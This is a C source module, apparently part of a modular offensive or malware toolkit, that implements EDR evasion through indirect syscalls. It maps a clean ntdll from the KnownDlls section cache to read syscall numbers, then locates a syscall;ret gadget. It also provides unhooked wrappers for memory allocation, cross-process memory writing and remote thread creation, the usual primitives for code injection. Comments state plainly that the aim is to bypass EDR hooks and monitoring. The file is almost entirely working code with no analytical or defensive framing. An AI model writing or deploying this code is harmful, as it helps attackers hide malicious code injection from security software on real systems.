// chunk: evasion/syscall_knowndlls
// depends: (none)
// provides: init_indirect_syscalls, indirect_NtAllocateVirtualMemory, indirect_NtWriteVirtualMemory, indirect_NtCreateThreadEx, indirect_NtQuerySystemInformation
// headers: windows.h
// risk: low
// note: KnownDlls section-based SSN resolution — maps a clean ntdll from \KnownDlls\ via NtOpenSection+NtMapViewOfSection. Avoids disk reads (EDRs monitor NtReadFile on ntdll) and avoids the hooked in-memory copy. The mapped view is a pristine copy directly from the OS section cache.

#ifndef CHUNK_SYSCALL_KNOWNDLLS
#define CHUNK_SYSCALL_KNOWNDLLS

static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;
static DWORD ssn_NtQuerySystemInformation = 0;
static void *syscall_ret_gadget = NULL;

typedef struct _KD_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} KD_UNICODE_STRING;

typedef struct _KD_OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    KD_UNICODE_STRING *ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} KD_OBJECT_ATTRIBUTES;

#define KD_OBJ_CASE_INSENSITIVE 0x00000040

typedef NTSTATUS (NTAPI *pfnNtOpenSection)(PHANDLE, ACCESS_MASK, KD_OBJECT_ATTRIBUTES *);
typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pfnNtClose)(HANDLE);

static DWORD kd_resolve_ssn_from_clean(BYTE *clean_base, const char *func_name) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)clean_base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(clean_base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return 0;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(clean_base + exp_rva);
    DWORD *names = (DWORD *)(clean_base + exp->AddressOfNames);
    WORD *ords = (WORD *)(clean_base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(clean_base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(clean_base + names[i]);
        if (strcmp(name, func_name) == 0) {
            BYTE *code = clean_base + funcs[ords[i]];
            // Clean copy — standard stub: 4C 8B D1 B8 <SSN>
            if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8)
                return *(DWORD *)(code + 4);
            return 0;
        }
    }
    return 0;
}

static void *kd_find_gadget(HMODULE ntdll) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                if (start[j] == 0x0F && start[j + 1] == 0x05 && start[j + 2] == 0xC3)
                    return (void *)(start + j);
            }
        }
    }
    return NULL;
}

static int init_indirect_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnNtOpenSection pNtOpenSection = (pfnNtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
    pfnNtMapViewOfSection pNtMapViewOfSection = (pfnNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    pfnNtUnmapViewOfSection pNtUnmapViewOfSection = (pfnNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    pfnNtClose pNtClose = (pfnNtClose)GetProcAddress(ntdll, "NtClose");

    if (!pNtOpenSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection || !pNtClose)
        return 0;

    // Open \KnownDlls\ntdll.dll section
    WCHAR kd_path[] = L"\\KnownDlls\\ntdll.dll";
    KD_UNICODE_STRING us;
    us.Buffer = kd_path;
    us.Length = (USHORT)(wcslen(kd_path) * sizeof(WCHAR));
    us.MaximumLength = us.Length + sizeof(WCHAR);

    KD_OBJECT_ATTRIBUTES oa;
    oa.Length = sizeof(oa);
    oa.RootDirectory = NULL;
    oa.ObjectName = &us;
    oa.Attributes = KD_OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor = NULL;
    oa.SecurityQualityOfService = NULL;

    HANDLE hSection = NULL;
    NTSTATUS status = pNtOpenSection(&hSection, SECTION_MAP_READ, &oa);
    if (status != 0 || !hSection) return 0;

    // Map the clean ntdll copy
    PVOID clean_ntdll = NULL;
    SIZE_T view_size = 0;
    status = pNtMapViewOfSection(hSection, GetCurrentProcess(), &clean_ntdll, 0, 0,
                                  NULL, &view_size, 1 /* ViewShare */, 0, PAGE_READONLY);
    pNtClose(hSection);
    if (status != 0 || !clean_ntdll) return 0;

    // Resolve SSNs from the clean mapped copy
    ssn_NtAllocateVirtualMemory = kd_resolve_ssn_from_clean((BYTE *)clean_ntdll, "NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = kd_resolve_ssn_from_clean((BYTE *)clean_ntdll, "NtWriteVirtualMemory");
    ssn_NtCreateThreadEx        = kd_resolve_ssn_from_clean((BYTE *)clean_ntdll, "NtCreateThreadEx");
    ssn_NtQuerySystemInformation = kd_resolve_ssn_from_clean((BYTE *)clean_ntdll, "NtQuerySystemInformation");

    // Unmap — we only needed the SSNs
    pNtUnmapViewOfSection(GetCurrentProcess(), clean_ntdll);

    // Find syscall;ret gadget from the in-memory (potentially hooked) ntdll
    syscall_ret_gadget = kd_find_gadget(ntdll);

    return (ssn_NtAllocateVirtualMemory != 0 &&
            ssn_NtWriteVirtualMemory != 0 &&
            ssn_NtCreateThreadEx != 0 &&
            ssn_NtQuerySystemInformation != 0 &&
            syscall_ret_gadget != NULL) ? 1 : 0;
}

__attribute__((naked))
static NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtAllocateVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtWriteVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtCreateThreadEx(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtQuerySystemInformation(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

#endif
